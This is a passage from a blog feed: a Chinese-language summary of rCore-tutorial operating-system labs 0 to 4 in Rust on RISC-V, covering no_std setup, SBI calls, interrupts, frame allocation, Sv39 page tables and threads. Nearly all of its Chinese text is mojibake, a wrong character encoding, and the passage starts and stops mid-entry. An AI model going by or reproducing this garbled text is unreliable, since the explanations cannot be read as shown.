            
            <tag> risc-v </tag>
            
            <tag> zCore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>rCore-tutorial æ€»ç»“æ–‡æ¡£</title>
      <link href="/2020/07/25/rCore-tutorial%E6%80%BB%E7%BB%93%E6%96%87%E6%A1%A3/"/>
      <url>/2020/07/25/rCore-tutorial%E6%80%BB%E7%BB%93%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="lab-ç®€å•æ€»ç»“"><a href="#lab-ç®€å•æ€»ç»“" class="headerlink" title="lab ç®€å•æ€»ç»“"></a>lab ç®€å•æ€»ç»“</h3><p>æœ¬æ–‡æ˜¯å¯¹rCore-tutorialç¬¬ä¸€é˜¶æ®µçš„6ä¸ªlabçš„æ€»ç»“æ–‡æ¡£ï¼Œç®€å•æ¦‚æ‹¬äº†æ¯ä¸ªlabçš„å†…å®¹å’Œä½œç”¨</p><a id="more"></a><h2 id="lab-0-ç®€å•æ€»ç»“"><a href="#lab-0-ç®€å•æ€»ç»“" class="headerlink" title="lab-0 ç®€å•æ€»ç»“"></a>lab-0 ç®€å•æ€»ç»“</h2><ol><li>ä¸ºäº†å€Ÿç”¨æ–°çš„ç‰¹æ€§ nightly</li><li>std ä¾èµ–æ“ä½œç³»ç»Ÿ <code>#![no_std]</code> ç¦ç”¨</li><li><code>panic_handler</code> ä¹Ÿåœ¨stdåº“ä¸­ï¼Œä½†æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¿…é¡»å®ç°ï¼Œæ‰€ä»¥æˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ª</li><li>å¼‚å¸¸æ—¶æ˜¯è¦é€šè¿‡å †æ ˆåå‘<strong>æ•è·å¼‚å¸¸</strong>å¹¶<strong>æ¸…ç†ç°åœº</strong>çš„ï¼Œæš‚æ—¶ä¸éœ€å®ç°ï¼Œæ‰€ä»¥panicç›´æ¥ç»ˆæ­¢</li><li><code>main</code>å‡½æ•°å¹¶ä¸èƒ½ä½œä¸ºæ“ä½œç³»ç»Ÿå…¥å£ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨<code>_start</code> å‡½æ•°ä»£æ›¿ï¼Œå¹¶åˆ©ç”¨ <code>extern &quot;C&quot;</code> å’Œ <code># [no_mangle]</code> æ¥ä½¿å¾—ä»–æˆä¸ºå…¥å£å‡½æ•°</li><li>é€šè¿‡æ”¹å˜é“¾æ¥å™¨å‚æ•°ï¼Œä½¿å¾—ç¨‹åºç¼–è¯‘æˆä¸ä¾èµ–å…¶ä»–è¿è¡Œæ—¶ç¯å¢ƒçš„è£¸æœºç›®æ ‡</li><li>å¯¹äºä¸€ä¸ªOSå†…æ ¸ï¼Œä»–çš„èµ·å§‹åœ°å€å’Œæ™®é€šç¨‹åºä¸åŒï¼Œåœ¨é«˜åœ°å€ä¸Šï¼Œé€šè¿‡æ›´æ”¹-é“¾æ¥è„šæœ¬</li><li>é€šè¿‡æ›´æ”¹é“¾æ¥è„šæœ¬ä½¿å¾—ï¼Œå†…æ ¸æ”¾åœ¨æ­£ç¡®çš„åœ°å€ä¸Šï¼Œå¹¶ä¾æ¬¡æŒ‰é¡ºåºæ’æ”¾ï¼Œ<code>_start</code> åœ¨å…ˆ.</li><li>å†…æ ¸è¿è¡Œè¿˜éœ€è¦ç¯å¢ƒæ”¯æŒï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æ±‡ç¼–é‡å†™<code>_start</code> ï¼Œåˆ†é…å¯åŠ¨æ ˆï¼Œå¹¶è·³è½¬åˆ°å†…æ ¸å…¥å£</li><li>å°†æ±‡ç¼–ä»£ç å†…è”åˆ°<code>main.rs</code>ä¸­ï¼Œå¹¶æ›´æ”¹å†…æ ¸å…¥å£ä¸º<code>rust_main</code></li><li>å»ºç«‹<code>Makefile</code> ä¿å­˜ç¼–è¯‘è¿è¡Œå‚æ•°ï¼Œæ–¹ä¾¿ç›´æ¥è°ƒç”¨è¿è¡Œ</li><li>OpenSBI æ‰€æä¾›çš„<code>SBI</code>è°ƒç”¨å‚æ•° <strong>0-8</strong> ï¼Œä¸ºæˆ‘ä»¬æä¾›æ“ä½œæ“ä½œç³»ç»Ÿçš„åŸºæœ¬åŠŸèƒ½</li><li>è¾“å‡ºåŠŸèƒ½åˆ©ç”¨<code>core</code>ä¸­çš„è¾“å‡ºå‡½æ•°è°ƒç”¨<code>SBI</code>çš„å•å­—ç¬¦è¾“å‡ºï¼Œå¹¶åˆ©ç”¨<code>println</code>ç­‰å®è¿›è¡Œå°è£…</li><li>å®Œå–„ <code>panic</code> å’Œ <code>abort</code> åŠŸèƒ½</li></ol><h2 id="lab-1-ç®€å•æ€»ç»“"><a href="#lab-1-ç®€å•æ€»ç»“" class="headerlink" title="lab-1 ç®€å•æ€»ç»“"></a>lab-1 ç®€å•æ€»ç»“</h2><ol><li><p>ä¸­æ–­å¤„ç†é¦–å…ˆè¦ä¿å­˜ä¸Šä¸‹æ–‡(å³å¯„å­˜å™¨)åœ¨æ ˆä¸­,å¹¶åœ¨ä¸­æ–­åæ¢å¤,åˆ†ä¸ºä¸¤éƒ¨åˆ†: </p><ul><li>context :é€šç”¨32ä¸ªå¯„å­˜å™¨,ä¿å­˜è§¦å‘ä¸­æ–­çš„æŒ‡ä»¤åœ°å€<code>sepc</code>å’Œç³»ç»ŸçŠ¶æ€çš„<code>sstatus</code></li><li>å•åˆ— :ä¿å­˜ä¸­æ–­ä¸»è¦ä¿¡æ¯å’ŒåŸå› çš„ <code>scause</code> å’Œ <code>stval</code>,å› ä¸ºåé¢éœ€è¦ä½¿ç”¨æ‰€ä»¥å•ç‹¬</li></ul></li><li><p>åˆ©ç”¨æ±‡ç¼–å°†å¯„å­˜å™¨çš„å€¼å­˜å‚¨åœ¨æ ˆä¸­,æ³¨æ„æ ˆå¯„å­˜å™¨<code>sp</code>å°±æ˜¯<code>x2</code>,æ‰€ä»¥éœ€è¦ç©ºå‡ºä»–</p></li><li><p>åˆ©ç”¨ <code>STIE</code> ä½å¼€å¯æ—¶é’Ÿä¸­æ–­,åˆ©ç”¨ <code>sstatus</code> çš„ <code>SIE</code> ä½,å…è®¸å†…æ ¸æ€è¢«ä¸­æ–­æ‰“æ–­</p></li><li><p>é€šè¿‡<code>sbi_call</code> å¯ä»¥é¢„çº¦ä¸‹ä¸€æ¬¡çš„æ—¶é’Ÿä¸­æ–­,<code>time</code>å‚æ•°å°±æ˜¯ä¸­æ–­æ—¶é—´</p></li><li><p>æ€»ç»“ æ—¶é’Ÿä¸­æ–­çš„è°ƒç”¨è¿‡ç¨‹</p><img src="https://github.com/dingiso/DailySchedule/blob/master/img/TimeInterrupt.png" alt="æ—¶é’Ÿä¸­æ–­">## lab-2 ç®€å•æ€»ç»“</li><li><p>å¯¹äºåŠ¨æ€å†…å­˜åˆ†é…ï¼Œæˆ‘ä»¬éœ€è¦å®ä¾‹ä¸€ä¸ª<code>å †</code>å¯¹è±¡ï¼Œè€Œè¿™ä¸ªå¯¹è±¡å¿…é¡»å…·æœ‰ä»¥ä¸‹ç‰¹å¾</p><ul><li>å®ç° <code>Trait GlobalAlloc</code> çš„åˆ†é…åŠŸèƒ½<ul><li>å®ç° <code>alloc</code> å’Œ <code>dealloc</code> å‡½æ•°  ï¼Œ è¦æ±‚åˆ†é…è¿ç»­<code>size</code>å¤§å°ï¼Œæ»¡è¶³<code>align</code>å¯¹é½</li></ul></li><li>ä½¿ç”¨è¯­ä¹‰é¡¹<code>#[global_allocator]</code>è¿›è¡Œæ ‡è®°</li></ul><p>ç¼–è¯‘å™¨ä¾¿ä¼šè‡ªåŠ¨ä½¿ç”¨æˆ‘ä»¬æä¾›çš„å†…å­˜åˆ†é…å‡½æ•°</p></li><li><p>å…ˆå¼€è¾Ÿä¸€ä¸ª<code>u8</code>æ•°ç»„ï¼Œå°†é¦–åœ°å€å’Œé•¿åº¦ä»˜ç»™æˆ‘ä»¬å®šä¹‰å¥½çš„å †å¯¹è±¡å³å¯</p></li><li><p>æ¢å¯»å†…æ ¸ä½¿ç”¨çš„ç»“å°¾åœ°å€ï¼Œ<code>linker.ld</code> è¯´æ˜äº†ç»“å°¾åœ°å€ä¸º <code>kernel_end</code> æˆ‘ä»¬å°†æ­¤å‡½æ•°å®ç°ï¼Œå¹¶å°†ä»–çš„åœ°å€ ä½œä¸º <code>usize</code> è¾“å‡ºçš†å¯ã€‚</p></li></ol><h4 id="ç‰©ç†é¡µçš„ç®¡ç†ä¸åˆ†é…"><a href="#ç‰©ç†é¡µçš„ç®¡ç†ä¸åˆ†é…" class="headerlink" title="ç‰©ç†é¡µçš„ç®¡ç†ä¸åˆ†é…"></a>ç‰©ç†é¡µçš„ç®¡ç†ä¸åˆ†é…</h4><ol><li><p>é¡µé¦–åœ°å€æ»¡è¶³ 4kB çš„å€æ•° ï¼Œé¡µå· x4096 = é¡µé¦–åœ°å€</p></li><li><p>åˆ†é…çš„åœ°å€ä¸å­˜åœ¨å †æˆ–æ ˆä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨<code>FrameTracker</code>å°è£…ï¼Œå®ç°ç±»ä¼¼äº<code>Box</code> çš„æ™ºèƒ½æŒ‡é’ˆçš„ç›¸å…³ç‰¹æ€§ï¼Œç›¸å½“äºæˆ‘ä»¬å¯¹<strong>é¡µ</strong>å®ç°äº†ä»¥ä¸‹æ“ä½œï¼š</p><ul><li>å°è£…äº† <code>&amp;&#39;static mut</code> ç±»å‹çš„å¼•ç”¨</li><li>æä¾›äº† <code>Drop</code> å‡½æ•°ï¼Œå­˜åœ¨ç”Ÿå‘½å‘¨æœŸï¼Œè¶…å‡ºåè‡ªåŠ¨ææ„</li><li>éœ€è¦å¼•ç”¨è®¡æ•°åˆ™å¤–é¢å°è£… <a href="alloc::sync::Arc"><code>Arc</code></a> </li></ul></li><li><p>é’ˆå¯¹æ‰€æœ‰çš„ç‰©ç†é¡µï¼Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªç‰©ç†é¡µåˆ†é…å™¨å°è£…å¯¹é¡µçš„æ“ä½œ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">static</span> <span class="keyword">ref</span> FRAME_ALLOCATOR: Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt; = Mutex::new(FrameAllocator::new(Range::from(PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS),)));</span><br></pre></td></tr></table></figure><p><strong><code>Mutex&lt;FrameAllocator&lt;AllocatorImpl&gt;&gt;</code></strong> </p><ul><li><p><code>Mutex</code>å¯¹åˆ†é…å™¨åŠ é”é˜²æ­¢å¤šä¸ªçº¿ç¨‹è®¿é—®ï¼Œ</p></li><li><p><code>FrameAllocator</code> ä¸ºä¸»è¦åˆ†é…å™¨ï¼Œ</p></li><li><p><code>AllocatorImpl</code> ä¸ºåˆ†é…å™¨ç®—æ³•ã€‚</p></li></ul><p><code>PhysicalPageNumber::ceil(PhysicalAddress::from(*KERNEL_END_ADDRESS))..PhysicalPageNumber::floor(MEMORY_END_ADDRESS)</code></p><p>åˆ†é…å™¨åˆ†é…çš„å†…å­˜èŒƒå›´ä» <code>kerne_end</code> ç»“æŸï¼ˆä¸Šå–æ•´ï¼‰å¼€å§‹åˆ° æˆ‘ä»¬å¯è®¿é—®å†…å­˜çš„æœ€åçš„ï¼ˆä¸‹å–æ•´ï¼‰</p></li><li><p>åˆ†é…å™¨ç®—æ³•åˆ©ç”¨çš„æ˜¯å®é™…ç‰©ç†é¡µå’Œèµ·å§‹åœ°å€çš„åç§»é‡</p></li></ol><h2 id="lab-3-ç®€å•æ€»ç»“"><a href="#lab-3-ç®€å•æ€»ç»“" class="headerlink" title="lab-3 ç®€å•æ€»ç»“"></a>lab-3 ç®€å•æ€»ç»“</h2><h3 id="åŸºç¡€å†…å®¹-å…³äºé¡µè¡¨"><a href="#åŸºç¡€å†…å®¹-å…³äºé¡µè¡¨" class="headerlink" title="åŸºç¡€å†…å®¹ - å…³äºé¡µè¡¨"></a>åŸºç¡€å†…å®¹ - å…³äºé¡µè¡¨</h3><h3 id="é¦–å…ˆï¼š-ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è™šæ‹Ÿåœ°å€ï¼Ÿ"><a href="#é¦–å…ˆï¼š-ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è™šæ‹Ÿåœ°å€ï¼Ÿ" class="headerlink" title="é¦–å…ˆï¼š ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è™šæ‹Ÿåœ°å€ï¼Ÿ"></a>é¦–å…ˆï¼š ä¸ºä»€ä¹ˆè¦ç”¨åˆ°è™šæ‹Ÿåœ°å€ï¼Ÿ</h3><p>ç®€å•ç†è§£ï¼Œè¿™æ˜¯ä¸ºäº†æ–¹ä¾¿ç¨‹åºç¼–å†™è€…çš„ä¸€ç§æ–¹æ³•ã€‚æ¯”å¦‚æˆ‘çš„ç¨‹åºæƒ³è¦è¿è¡Œåœ¨è¿™ä¸ªæ“ä½œç³»ç»Ÿä¸Šï¼Œ æˆ‘å¸Œæœ›ä¸éœ€è¦è€ƒè™‘æ“ä½œç³»ç»Ÿçš„å®é™…å†…å­˜æƒ…å†µï¼Œéš¾é“æˆ‘è¿˜è¦çœ‹ä¸€ä¸‹æ“ä½œç³»ç»Ÿçš„ä»£ç ï¼Œæˆ–ç¿»ä¸€ä¸‹æ‰‹å†Œä¹ˆï¼Ÿ ï¼Œ æˆ‘å¸Œæœ›æˆ‘çš„ç¨‹åºç”¨çš„å°±æ˜¯ä» <code>0x1</code> å¼€å§‹çš„è¿ç»­åœ°å€ï¼Œé‚£ä¹ˆè¿™ä¸ª <code>0x1</code> å°±æ˜¯è™šæ‹Ÿåœ°å€ã€‚</p><h3 id="é¡µè¡¨ï¼š"><a href="#é¡µè¡¨ï¼š" class="headerlink" title="é¡µè¡¨ï¼š"></a>é¡µè¡¨ï¼š</h3><p>ä½†æ˜¯åœ¨æ“ä½œç³»ç»Ÿä¸­ï¼Œå®é™…è¿è¡Œæ—¶æ˜¯éœ€è¦ä½¿ç”¨å®é™…ç‰©ç†åœ°å€çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•æ¨ç®—ç‰©ç†åœ°å€å‘¢ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ç§ï¼ˆè™šæ‹Ÿåœ°å€-ç‰©ç†åœ°å€ï¼‰çœ‹ä½œä¸€ç§å‡½æ•°ï¼ˆæ˜ å°„ï¼‰å…³ç³»<br><code>f (è™šæ‹Ÿåœ°å€ï¼‰= ç‰©ç†åœ°å€</code> åœ¨å­˜å‚¨æ—¶ å°±æœ‰äº†ä¸¤ç§å‚¨å­˜çš„æ–¹æ³•ï¼Œ</p><ol><li>ç¬¬ä¸€ç§ æˆ‘ä»¬å°†è¿™ä¸ª <code>f</code> å‡½æ•°ï¼ˆç®€å•ç†è§£æ˜¯ä¸ªçº¿æ€§çš„ï¼‰å…³ç³»å‚¨å­˜ä¸‹æ¥ - ä¹Ÿå°±æ˜¯ æœ€å¼€å§‹<a href="https://rcore-os.github.io/rCore-Tutorial-deploy/docs/lab-3/guide/part-2.html">ä¿®æ”¹å†…æ ¸</a> ä¸­ä½¿ç”¨çš„æ–¹æ³•ï¼Œ åªéœ€è¦ç»Ÿä¸€åŠ ä¸€ä¸ª åç§»é‡å³å¯ã€‚</li><li>ç¬¬äºŒç§ æˆ‘ä»¬å°†æ¯ä¸€ä¸ª ï¼ˆè™šæ‹Ÿåœ°å€-ç‰©ç†åœ°å€ï¼‰ ä¹Ÿå°± (x,y) æŒ‰å¯¹å­˜å‚¨èµ·æ¥ï¼Œé€šè¿‡æŸ¥æ‰¾ è™šæ‹Ÿåœ°å€ï¼Œä¾¿èƒ½è·å¾—ç›¸åº”çš„ç‰©ç†åœ°å€ã€‚</li></ol><p>ç¬¬äºŒç§æ–¹æ³•ä¾¿æ˜¯æˆ‘ä»¬æ‰€è¯´çš„é¡µè¡¨ ï¼Œ ä»–æ˜¯ä¸€ï¼ˆå¤šï¼‰å¼ ï¼Œå­˜å‚¨è¿™ç§å…³ç³»çš„è¡¨ï¼Œé€šè¿‡æŸ¥è¡¨ä¾¿èƒ½å®Œæˆ æŸ¥æ‰¾ç‰©ç†åœ°å€çš„ä»»åŠ¡ã€‚</p><blockquote><p>è€Œä¸”ï¼Œè™šæ‹Ÿåœ°å€ä¹Ÿæ˜¯å¯¹ç‰©ç†çš„åœ°å€çš„ä¸€ç§å°è£…æ–¹æ³•ï¼Œå¯ä»¥å®ç°å†…æ ¸å¯¹ç‰©ç†åœ°å€çš„æƒé™ç®¡ç†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨é¡µè¡¨é¡¹çš„æ ‡å¿—ä½ï¼Œå‡è®¾æˆ‘ä¸å¸Œæœ›ç³»ç»Ÿå†…æ ¸æ‰€åœ¨çš„åœ°å€è¢«å…¶ä»–äººå†™å…¥å…¶ä»–å†…å®¹ï¼Œæˆ‘åªéœ€è¦åœ¨é¡µè¡¨é¡¹ä¸Š</p></blockquote><h3 id="å¤šçº§é¡µè¡¨ï¼š"><a href="#å¤šçº§é¡µè¡¨ï¼š" class="headerlink" title="å¤šçº§é¡µè¡¨ï¼š"></a>å¤šçº§é¡µè¡¨ï¼š</h3><p>è¿™ç§æ–¹æ³•ä¸»è¦æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜ï¼ŒåŒæ—¶å¯ä»¥æ–¹ä¾¿æˆ‘ä»¬ä¸ç”¨è·¨ç‰©ç†é¡µå»æŸ¥è¯¢è¿™å¼ è¡¨ã€‚é‚£ä¹ˆä»–ä¸ºä»€ä¹ˆå¯ä»¥èŠ‚çœå†…å­˜å‘¢ï¼Ÿ<br><strong>ä¸¾ä¸ªå°æ —å­ï¼š</strong> å†…æ ¸ä»£ç åœ¨è™šæ‹Ÿåœ°å€é‡Œ æ˜¯ <code>0xffffffff80200000</code> ï¼Œ åœ¨å®é™…ç‰©ç†åœ°å€æ˜¯ <code>0x80200000</code> ï¼Œ åœ¨æ™®é€šé¡µè¡¨ä¸­æˆ‘è¦è¿™ä¹ˆå­˜å‚¨ï¼Œ <code>(0xffffffff80200000,0x80200000,flag)</code> è¿™æ ·çš„ã€‚åŒæ ·åœ¨è¡¨ç¤ºå†…æ ¸ä»¥ 0xffffffff å¼€å¤´çš„è™šæ‹Ÿåœ°å€è¿˜æœ‰å¾ˆå¤šï¼Œè¿™æ ·ä¼šæ— å½¢ä¸­å¢åŠ å¾ˆå¤šçš„ç©ºé—´å¼€é”€ï¼Œä½†æˆ‘ä»¬çŸ¥é“ä¸æ–­å­˜å‚¨ <code>0xffffffff</code> æ˜¯å†—ä½™çš„ã€‚æ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨åˆ†çº§çš„æ–¹æ³•ï¼Œå¯ä»¥æŠŠé¡µè¡¨å˜æˆä¸‹é¢çš„å½¢å¼ï¼ˆç†è§£æ–¹æ³•ï¼‰ï¼š</p><ul><li>äºŒçº§é¡µè¡¨ <code>ï¼ˆ0xffffffffï¼ˆè™šæ‹Ÿåœ°å€çš„é«˜ä½ï¼‰ï¼Œå­˜å‚¨ä¸‹é¢ä¸€çº§é¡µè¡¨çš„ç‰©ç†é¡µå·ï¼ˆé¦–åœ°å€ï¼‰ ï¼‰</code></li><li>ä¸€çº§é¡µè¡¨ <code>ï¼ˆ0x80200000ï¼ˆä½ä½ï¼‰ï¼Œ0x80200000ï¼ˆç‰©ç†åœ°å€ï¼‰ï¼‰</code><br>é€šè¿‡äºŒçº§é¡µè¡¨æŸ¥æ‰¾åˆ°ä¸€çº§é¡µè¡¨çš„å­˜å‚¨ä½ç½®ï¼Œå†é€šè¿‡ä½ä½æ‰¾åˆ°å¯¹åº”çš„ç‰©ç†åœ°å€ã€‚</li></ul><p><strong>é‚£ä¹ˆ</strong>æˆ‘ä»¬å®é™…ä¸Šå¯¹äºæ‰€æœ‰ ä»¥å¼€å¤´ <code>0xffffffff</code> å¼€å¤´çš„è™šæ‹Ÿåœ°å€ï¼ŒäºŒçº§é¡µè¡¨ä¸­æ°¸è¿œåªæœ‰ä¸€ä¸ªé¡µè¡¨é¡¹ï¼Œè¿™å°±èŠ‚çœäº†åŸæ¥æ¯æ¬¡éƒ½è¦æŠŠä»–å†™ä¸Šçš„ç©ºé—´ã€‚</p><h3 id="ä»£ç éƒ¨åˆ†"><a href="#ä»£ç éƒ¨åˆ†" class="headerlink" title="ä»£ç éƒ¨åˆ†"></a>ä»£ç éƒ¨åˆ†</h3><ol><li><p> æ›´æ”¹ linker.ld çš„æ•°æ®å­˜æ”¾èµ·å€æ”¹ä¸ºè™šæ‹Ÿåœ°å€ï¼Œå¹¶åœ¨å„å­—æ®µåŠ å…¥å¯¹é½ï¼Œä½¿å¾—ä¸€ä¸ªè™šæ‹Ÿé¡µä¸ä¼šæœ‰ä¸¤ä¸ªæ®µã€‚ç›®çš„æ˜¯ä¸ºäº†å¯ä»¥å¯¹æ¯ä¸€ä¸ªæ®µèµ‹äºˆä¸åŒçš„å±æ€§</p></li><li><p>entry.asm ä¸­åˆ©ç”¨  ä¸‹é¢ä»£ç ä½¿å¾— CPUæ¨¡å¼ å˜ä¸º Sv39</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 8 &lt;&lt; 60 æ˜¯ satp ä¸­ä½¿ç”¨ Sv39 æ¨¡å¼çš„è®°å·</span><br><span class="line">    li t1, (8 &lt;&lt; 60)</span><br><span class="line">    or t0, t0, t1</span><br><span class="line">    # å†™å…¥ satp å¹¶æ›´æ–° TLB</span><br><span class="line">    csrw satp, t0</span><br></pre></td></tr></table></figure></li><li><p>ç»™å‡ºå†…æ ¸ä½¿ç”¨çº¿æ€§æ˜ å°„çš„åç§»é‡ å¹¶ åœ¨ entry.asm ä¸­ å»ºç«‹ä¸€ä¸ªboot_page_table ä½œä¸ºåˆå§‹é¡µè¡¨ï¼Œ</p><ul><li>ç¬¬ä¸€ä¸ªæ˜ å°„æ˜¯ 0x8000_0000 -&gt; 0x8000_0000 VPN3 æ˜¯ 10B æ‰€ä»¥æ”¾åœ¨ç¬¬ä¸‰ä½</li><li>ç¬¬äºŒä¸ªæ˜ å°„æ˜¯ 0xffff_ffff_8000_0000 -&gt; 0x8000_0000 VPN3 æ˜¯ 111111110B æ‰€ä»¥æ”¾åœ¨ 510ä½</li><li>ä¿å­˜ç¬¬ä¸€ä¸ªæ˜ å°„æ˜¯è¿åè§„åˆ™çš„ï¼Œä½†æ˜¯ä¸ºäº†æ‰§è¡Œ è¿™ä¸ªasmå†…çš„ä»£ç ï¼Œæ‰€ä»¥è¦å­˜åœ¨è¿™ä¸ªæ˜ å°„ã€‚</li></ul></li><li><p>å°†è™šæ‹Ÿåœ°å€ åˆ†ä¸º <code>0..9 çš„VPN1</code> <code>9..18çš„VPN2</code> <code>18..27çš„VPN3</code></p></li><li><p><strong>é¡µè¡¨é¡¹  ï¼šPageTableEntry = æ ‡å¿—ä½+é¡µå·</strong>   |å¯¹ ç‰©ç†é¡µå·è¿›è¡Œå°è£…</p></li><li><p><strong>é¡µè¡¨ ï¼šPageTable</strong> |è£…æ»¡ä¸€ä¸ªç‰©ç†é¡µçš„é¡µè¡¨é¡¹æ•°ç»„</p></li><li><p><strong>é¡µè¡¨æ™ºèƒ½æŒ‡é’ˆï¼šPageTableTracker</strong> å› ä¸ºé¡µè¡¨å¤ªå¤§äº†ï¼Œæ‰€ä»¥åˆ©ç”¨ä¸Šæ–‡æä¾›çš„å·¥å…· <code>FrameTracker</code> ï¼Œå°†è¿™ä¸ªé¡µè¡¨å½“æˆä¸€ä¸ªç‰©ç†é¡µçœ‹å¾…ï¼Œåˆ©ç”¨â€œæ™ºèƒ½æŒ‡é’ˆâ€å¯¹å…¶è¿›è¡Œæ“ä½œã€‚</p></li><li><p><strong>å†…å­˜æ®µï¼šSegment</strong> |åœ¨å¾ˆå¤šæƒ…å†µä¸‹è™šæ‹Ÿé¡µçš„å•ä½é‡çº§å¤ªå°äº†ï¼Œæˆ‘ä»¬å¯¹å†…å­˜çš„ç®¡ç†å¯èƒ½ä¸€æ¬¡æ¶‰åŠå¾ˆå¤šé¡µï¼Œä¸ºäº†ç®€åŒ–æ“ä½œï¼Œæˆ‘ä»¬å°†å¾ˆå¤šè™šæ‹Ÿé¡µç»Ÿä¸€å°è£…ä¸ºä¸€ä¸ª<code>Segment</code>ï¼Œå®ƒå…·æœ‰ä»¥ä¸‹å±æ€§</p><ul><li>ä¸¤ç§ç®€å•çš„æ˜ å°„ç±»å‹ ï¼š çº¿æ€§æ˜ å°„ å’Œ æ¯ä¸€å¸§éƒ½æœ‰æ˜ å°„</li><li>æ˜ å°„åˆ°çš„ä¸€å—è¿ç»­çš„è™šæ‹Ÿåœ°å€</li><li>ç»Ÿä¸€çš„æƒé™æ ‡è¯†</li></ul></li><li><p><strong>å®é™…åº”ç”¨çš„æ˜ å°„å…³ç³»ï¼šMapping</strong> | å®Œæˆäº†åŸºç¡€çš„ç»“æ„å®šä¹‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å®é™…çš„å¯¹æ¯ä¸ªçº¿ç¨‹çš„æ˜ å°„å…³ç³»è¿›è¡Œå°è£…å¹¶å®Œæˆå®é™…çš„æ“ä½œå’Œç»“æ„äº†ï¼š</p><ul><li>ä¿å­˜äº† é¡µè¡¨å‘é‡ ï¼Œ æ ¹é¡µè¡¨ç‰©ç†é¡µå·ï¼Œ æ˜ å°„ä¿¡æ¯</li><li><code>find_entry()</code> å®ç° ç»™å®šè™šæ‹Ÿé¡µå·æŸ¥æ‰¾ç‰©ç†é¡µå·</li><li><code>map()</code> å®ç°äº†å®é™…æ•°æ®ï¼ˆæœªå†™å…¥é¡µä¸­ï¼‰çš„å†™å…¥å¹¶æ„å»ºæ˜ å°„<ul><li>çº¿æ€§åˆ™åˆ©ç”¨ æˆ‘ä»¬<code>address.rs</code> ä¸­è§„å®šçš„æ–¹å¼ç›´æ¥è½¬æ¢</li><li><code>Framed</code> åˆ™ åˆ†å‰²æ•°æ® ï¼Œ æ›´æ–°é¡µè¡¨ï¼Œå†™å…¥ç‰©ç†é¡µï¼Œ å°†æ˜ å°„å…³ç³»å†™å…¥æ˜ å°„</li></ul></li><li><code>activate()</code> å®ç°äº†å°†é¡µè¡¨èµ·ä½¿åœ°å€å†™å…¥<code>satp</code> ï¼Œä½¿ç”¨<code>Sv39</code>æ¨¡å¼å¹¶ åˆ·æ–°<code>TLB</code></li></ul></li><li><p><strong>å®ç°å†…æ ¸çš„é‡æ˜ å°„ ï¼šMemorySet</strong> ï¼š åˆ©ç”¨æˆ‘ä»¬å·¥ä½œæ›¿ä»£åŸæ¥çš„è›®å¤·ï¼Œ</p></li></ol><h2 id="lab-4"><a href="#lab-4" class="headerlink" title="lab-4"></a>lab-4</h2><ol><li><p><strong>çº¿ç¨‹ï¼šThread</strong> | çº¿ç¨‹æ˜¯æˆ‘ä»¬å…³æ³¨çš„å®é™…<strong>æ‰§è¡Œä»£ç çš„å•ä½</strong>ï¼Œæ•™ç¨‹çš„å®šä¹‰åŒ…æ‹¬</p><ul><li><p>çº¿ç¨‹ ID  - å”¯ä¸€æ ‡è¯†çº¿ç¨‹çš„èº«ä»½</p></li><li><p>çº¿ç¨‹çš„æ ˆ - çº¿ç¨‹å æœ‰ä¸€æ®µçš„è™šæ‹Ÿç©ºé—´æ¥è¿›è¡Œåˆ©ç”¨</p></li><li><p>æ‰€å±çš„è¿›ç¨‹</p></li><li><p>ä»£è¡¨è‡ªèº«æƒ…å†µçš„å¯å˜å˜é‡ï¼ˆ<code>Mutex</code>ï¼‰- åŒ…æ‹¬ è¿è¡Œä¸Šä¸‹æ–‡ï¼Œæ˜¯å¦ä¼‘çœ ï¼Œç»“æŸç­‰å±æ€§ ï¼Œ </p><blockquote><p>åˆ©ç”¨ <code>Mutex</code> æ¥åŒ…è£…ä½¿å¾— <code>Arc&lt;Thread&gt;</code> ä¿å­˜çš„çº¿ç¨‹ä¸­çš„è¿™äº›å€¼å¯ä»¥è¢«æˆ‘ä»¬ä½¿ç”¨ã€‚</p></blockquote></li></ul></li><li><p> <strong>è¿›ç¨‹ï¼š Process</strong> | èµ„æºè°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œåªéœ€è¦ä¿å­˜è‡ªèº«å±æ€§å’Œ çº¿ç¨‹å…±äº«é¡µè¡¨ï¼Œå†…å­˜ç©ºé—´å³å¯</p></li></ol><ul><li>å±äº ç”¨æˆ·æ€ è¿˜æ˜¯ å†…æ ¸æ€</li><li>å…±ç”¨çš„ ä¸€å— å†…å­˜ç©ºé—´ï¼Œé¡µè¡¨</li></ul><ol start="3"><li><p><strong>çº¿ç¨‹ç®¡ç†å™¨ï¼šProcessor</strong> | å­˜æ”¾å’Œç®¡ç†æ‰€æœ‰çš„çº¿ç¨‹ï¼Œä¸»è¦åŒ…æ‹¬ï¼š</p><ul><li>æ­£åœ¨æ‰§è¡Œçš„çº¿ç¨‹</li><li>è°ƒåº¦å™¨ å¯¹çº¿ç¨‹å®ç°è°ƒåº¦ï¼ŒåŒ…æ‹¬çº¿ç¨‹çš„æ·»åŠ ï¼Œç§»é™¤ï¼Œè¿›è¡Œä¸‹ä¸€ä¸ª</li><li>ä¼‘çœ 